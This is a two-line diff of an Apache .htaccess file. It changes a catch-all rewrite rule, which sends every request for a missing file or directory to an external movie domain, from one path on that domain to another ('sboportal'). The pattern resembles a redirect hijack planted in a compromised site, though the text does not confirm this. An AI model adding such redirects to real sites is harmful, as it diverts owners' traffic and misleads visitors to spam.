@@ -4,4 +4,4 @@ RewriteBase /
 RewriteEngine On
 RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule ^ https://23movies.xyz/cybervibes/ [L]
+RewriteRule ^ https://23movies.xyz/sboportal/ [L]
